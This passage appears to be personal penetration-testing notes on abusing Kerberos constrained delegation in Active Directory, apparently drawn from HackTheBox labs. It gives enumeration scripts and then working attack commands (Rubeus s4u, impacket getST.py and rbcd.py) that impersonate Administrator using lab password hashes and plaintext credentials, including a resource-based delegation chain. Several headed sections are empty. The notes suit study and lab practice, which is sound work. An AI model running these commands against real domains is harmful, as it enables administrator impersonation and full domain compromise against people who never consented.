- list of services allowed for delegation is stored in the `msDS-AllowedToDelegateTo` attribute of the service account in charge of the delegation.
- If protocol transition isn't enabled to specific delegation, then you can't use `S4U2Self`.
- Service Ticket is forwardable (which is the default but can be disabled if the `Account is sensitive and cannot be delegated` flag is set in the user's UAC flags).

---
### Enumeration
```powershell
# Get all computers with constrained delegation
Get-ADComputer -Filter {msDS-AllowedToDelegateTo -like "*"} -Properties msDS-AllowedToDelegateTo | 
Select-Object Name, msDS-AllowedToDelegateTo

# Get all users with constrained delegation  
Get-ADUser -Filter {msDS-AllowedToDelegateTo -like "*"} -Properties msDS-AllowedToDelegateTo |
Select-Object Name, msDS-AllowedToDelegateTo

# Comprehensive constrained delegation report
$constrainedDelegation = Get-ADObject -Filter {msDS-AllowedToDelegateTo -like "*"} -Properties msDS-AllowedToDelegateTo, DistinguishedName, ObjectClass

foreach ($object in $constrainedDelegation) {
    Write-Host "=== $($object.Name) ($($object.ObjectClass)) ===" -ForegroundColor Yellow
    foreach ($service in $object.msDS-AllowedToDelegateTo) {
        Write-Host "  Can delegate to: $service" -ForegroundColor Green
    }
    Write-Host ""
}

# _________ ldap __________
# LDAP filter for constrained delegation
$searcher = [System.DirectoryServices.DirectorySearcher]::new()
$searcher.Filter = "(&(msDS-AllowedToDelegateTo=*))"
$searcher.PropertiesToLoad.AddRange(@("name", "msDS-AllowedToDelegateTo", "distinguishedName", "objectClass"))

$results = $searcher.FindAll()

foreach ($result in $results) {
    $name = $result.Properties["name"][0]
    $objectClass = $result.Properties["objectClass"][0]
    $services = $result.Properties["msDS-AllowedToDelegateTo"]
    
    Write-Host "$name ($objectClass) can delegate to:" -ForegroundColor Yellow
    foreach ($service in $services) {
        Write-Host "  - $service" -ForegroundColor Green
    }
}
```

Linux
```sh
# Linux 
findDelegation.py INLANEFREIGHT.LOCAL/carole.rose:jasmine
# ____ bloodhound ____

```

---
## protocol transition enabled
### Winodws
```powershell
# ask for tgt then get forwardable TGS using s4u then get TGS using s4u2proxy.
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:www/WS01.inlanefreight.local /altservice:HTTP /user:DMZ01$ /rc4:ff955e93a130f5bb1a6565f32b7dc127 /ptt

```
### linux
```sh
getST.py -spn TERMSRV/DC01 'INLANEFREIGHT.LOCAL/beth.richards:B3thR!ch@rd$' -impersonate Administrator
```

---
## Protocol transition disabled
Use RBCD like rebound i ts very easy. If we have constrained delegation B -> C, but protocol transition is disabled then we can't impersonate administrator directly. 
So, we create RBCD A -> B, this will enable us to request a ticket as administrator on B, Then look at this as general overview, this became classic constrained delegation process, you have TGS on B as administrator, you can use this as additional ticket to prove the admin has connected to B and request a TGS on C as administrator too.

### Windows
```

```

### Linux
```sh
rbcd.py 'rebound.htb/delegator$' -hashes :E1630B0E18242439A50E9D8B5F5B7524 -k -delegate-from ldap_monitor -delegate-to 'delegator$' -action write -dc-ip dc01.rebound.htb -use-ldaps
findDelegation.py 'rebound.htb/delegator$' -dc-ip 10.10.11.231 -k -hashes :E1630B0E18242439A50E9D8B5F5B7524
getST.py 'rebound.htb/ldap_monitor:1GR8t@$$4u' -spn browser/delegator.rebound.htb -impersonate Administrator
[*] Saving ticket in administrator@browser_delegator.rebound.htb@REBOUND.HTB.ccache

getST.py -spn http/dc01.rebound.htb -impersonate 'DC01$' 'rebound.htb/delegator$' -hashes :E1630B0E18242439A50E9D8B5F5B7524 -additional-ticket administrator@browser_delegator.rebound.htb@REBOUND.HTB.ccache

```
